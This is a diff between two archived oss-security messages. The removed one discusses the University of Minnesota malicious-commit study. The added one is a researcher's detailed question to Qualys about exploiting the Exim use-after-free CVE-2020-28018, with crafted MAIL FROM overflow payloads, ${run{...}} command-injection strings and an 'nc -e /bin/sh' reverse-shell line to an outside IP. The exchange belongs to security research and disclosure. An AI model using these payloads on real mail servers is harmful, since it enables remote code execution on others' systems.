@@ -1,70 +1,164 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/04/22/10
-Message-ID: <627170ea-4e1e-1a3d-8291-494eac38c9b@dereferenced.org>
-Date: Thu, 22 Apr 2021 10:58:12 -0600 (MDT)
-From: Ariadne Conill <ariadne@...eferenced.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Malicious commits to Linux kernel as part of university study
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/11/15
+Message-ID: <CAOni+oOrTbyTC0szU3yvXKaygs=CB41ENj1kBG44c2d1KbGK3g@mail.gmail.com>
+Date: Tue, 11 May 2021 23:18:12 +0200
+From: null p0int3r <nullp0int3rx@...il.com>
+To: Qualys Security Advisory <qsa@...lys.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: [CVE-2020-28018] Use-After-Free on Exim Question
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Hi again!
 
-On Thu, 22 Apr 2021, David A. Wheeler wrote:
+Thanks for the reply.
 
-> Peter Bex:
->> The university of Minnesota has been banned from making any commits to
->> the Linux kernel after it was found out they'd been submitting bogus
->> patches to the LKML to knowingly introduce security issues:
->> https://lore.kernel.org/linux-nfs/YH%2FfM%2FTsbmcZzwnX@kroah.com/
->
-> I support research, but I personally think this work goes way beyond any ethical boundaries.
-> While I don’t know if it’s *illegal* (I’m not a lawyer!), it seems clear to me that these
-> U of MN researchers were conducting experiments on people without their prior consent.
-> In the US, experiments on people without their consent is generally forbidden.
-> These researchers did their experiment *before* even consulting their Institutional Review Board (IRB),
-> a *huge* no-no, and then their IRB approved the non-consensual experiment anyway (!!!).
->
-> GregKH’s response to this attack from the U of MN here:
-> https://lore.kernel.org/linux-nfs/YH%2FfM%2FTsbmcZzwnX@kroah.com/
-> which reads in part:
->> Our community welcomes developers who wish to help and enhance Linux.
->> That is NOT what you are attempting to do here...
->> Our community does not appreciate being experimented on...
->
-> More discussion: https://news.ycombinator.com/item?id=26887670
->
-> Peter Bex:
->> I don't know the scope of this research, but it could involve other OSS
->> projects, now or in the future, as well.  Hence this e-mail.  If you feel
->> it's spam or needless drama, feel free to ignore.
->
-> Since the researchers failed to get prior consent from the people
-> being experimented on, I don’t think we can presume ethical behavior.
-> I have no faith that these researchers limited their attacks.
-> I hope they did, but I think we can take more proactive measures.
->
-> I used the following shell command to search for potentially-concerning commits in git:
->
-> git shortlog --summary --numbered --email | grep -E '(wu000273|kjlu|@....edu)'
->
-> I recommend other OSS projects do something similar, just in case, unless
-> we can have better verification that no other OSS projects were attacked.
-> I welcome improved methods to find concerning proposals or patches;
-> this is just a quick attempt to detect potential damage.
+In addition to my previous question, to leave it more clear...
 
-The paper says that they used throwaway Gmail accounts to submit the 
-patches.  Frustratingly, they have not identified which patches they 
-succeeded in landing in that paper.
+I successfully exploited the Use-After-Free to get Heap Address Leak and
+the arbitrary read primitive mentioned in the advisory.
 
-However, the paper also claims that they generated these "hypocrite" 
-commits using an LLVM-based static analysis tool.
+Talking about the arbitrary read, I sent a "MAIL FROM" command after the
+last "STARTTLS".
 
-Which means the work introduced by Aditya is likely directly related to 
-this experiment, since it has the same "feel" to it.
+When sending it after the STARTTLS (the last one before the UAF), the
+content sent is right next to the gstring freed buffer, something that does
+not happen when on plaintext, as the data is written far away from the
+target struct.
 
-By mining the LKML archive, it may be possible to find the original set of 
-patch submissions by searching for similar keywords as the messages from 
-Aditya.  If somebody can do that, then we would be able to determine at 
-least some of the emails likely to have originated the patches.
+Then sending a MAIL FROM command with any data, allowed me to enter some of
+that data in the gstring freed struct.
 
-Ariadne
+So... entering something like: MAIL FROM: <>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDDDD
+
+Would end up overwriting the g->size, g->ptr and g->s:
+
+g->size = 0x42424242
+g->ptr = 0x43434343
+g->s = 0x44444444
+
+Finally this will end up on arbitrary read, as having control of the
+gstring struct directly allow me read any address. When using this, the
+same response for that mentioned MAIL FROM command will contain the data
+where g->s points to. So I waste the chance of exploiting the UAF on it
+(but hopefully I can do it without any additional command).
+
+Also, perhaps receiving the "501 NUL characters are not allowed in SMTP
+commands" message, that response is written far away from my struct
+(because g->ptr contains a huge value), so no problem with it.
+
+That does not happen at the time of achieving a write-what-where, as this
+time, I depend on the response of the same command (because after the
+STARTTLS I have only one chance to exploit the UAF, else the pointer will
+be NULLed out).
+
+I though about sending a malformed-domain, so after overwriting the struct,
+part of response would be data I sent, in which a ${run{command}}  could
+exist:
+
+Sample: "501 ${run{command}} is an invalid address blablabla"
+
+This message would be entered where g->s points to.
+
+Unfortunately, the "501 NUL characters are not allowed in SMTP commands"
+message is used as response instead, so it is written into my target
+address instead of the data I want to.
+
+To avoid that message I though too about sending first a huge g->size
+value, then substract the value I use on g->ptr (like 0x01010101 to avoid
+NULLs) to the address I use to replace g->s.
+
+The only constraint of it is that as heap addresses contain at least 2 NULL
+bytes, the last part of the message would need to be the address and a new
+line character which is skipped on write, so if the buffer on that
+positions contain NULL bytes (something that happens as the last pointer
+stored there also contains 2 NULLs at the end as any heap address).
+
+Then if the previous data was:
+
+0x0000beefdeadbeef
+
+And I send: MAIL FROM: <>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDD
++
+<CRLF>
+
+The pointer would end up like this:
+
+0x0000444444444444
+
+In theory it would work but...unfortunately any reverse shell config length
+is higher than the number of characters from where I can start writing to
+the struct (26 bytes).
+
+[ 26-byte length space ] [ gstring struct ] [ ... ]
+^
+|
+|-------------- (start of my controlled buffer)
+
+
+strlen("${{nc -e /bin/sh 123.123.123.123 55555}}") = 40
+
+And I cannot add it after the gstring overwrite cause I need no more data
+as I do not want to enter non-NULL data on those two bytes for the address.
+
+So...
+
+How do you overwrite the gstring struct when you are on plaintext, so you
+can then freely send a MAIL FROM after the STARTTLS without facing those
+problems and directly getting it's response on target address previously
+corrupted?
+
+I saw some functions I could use for filling heap until overwriting my
+target, but they are just string-based so no NULL bytes possible.
+
+In the advisory it is mentioned the use of the name=value pair, but reading
+the code I see just string based functions used for allocations.
+
+Thanks again!
+Hope the question is more clear now
+
+El mar, 11 may 2021 a las 22:55, Qualys Security Advisory (<qsa@...lys.com>)
+escribió:
+
+> Hi,
+>
+> On Tue, May 11, 2021 at 01:23:43PM +0200, null p0int3r wrote:
+> > So I suppose that command is the first you send after the second
+> > "STARTTLS" command being sent right?
+>
+> Yes! After the second STARTTLS we send an invalid MAIL FROM command (for
+> example, "MAIL FROM:(\"${run{...}}\")\n"). Exim then responds with a 501
+> error message that includes our "${run{...}}" string, and since corked
+> in tls_write() is still non-NULL, this string is written to where the
+> used-after-free corked points to.
+>
+> Hopefully this helps!
+>
+> > PD: Congrats for those nice bugs discovered.
+>
+> Thank you very much for your mail!
+>
+> With best regards,
+>
+> --
+> the Qualys Security Advisory team
+>
+>
+> [https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png
+> ]<https://www.qualys.com/email-banner>
+>
+>
+>
+> This message may contain confidential and privileged information. If it
+> has been sent to you in error, please reply to advise the sender of the
+> error and then immediately delete it. If you are not the intended
+> recipient, do not read, copy, disclose or otherwise use this message. The
+> sender disclaims any liability for such unauthorized use. NOTE that all
+> incoming emails sent to Qualys email accounts will be archived and may be
+> scanned by us and/or by external service providers to detect and prevent
+> threats to our systems, investigate illegal or inappropriate behavior,
+> and/or eliminate unsolicited promotional emails (“spam”). If you have any
+> concerns about this process, please contact us.
+>
+
